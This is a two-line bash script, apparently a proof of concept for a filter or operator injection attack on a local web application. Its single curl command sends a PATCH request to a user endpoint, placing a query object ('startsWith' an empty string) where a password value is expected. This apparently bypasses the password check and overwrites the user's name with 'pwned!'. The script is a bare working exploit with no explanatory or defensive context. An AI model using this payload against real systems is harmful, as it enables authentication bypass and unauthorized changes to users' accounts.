#!/usr/bin/env bash
curl -X PATCH localhost:3000/users/1 -d '{"password":{"startsWith":""},"data":{"name":"pwned!"}}'
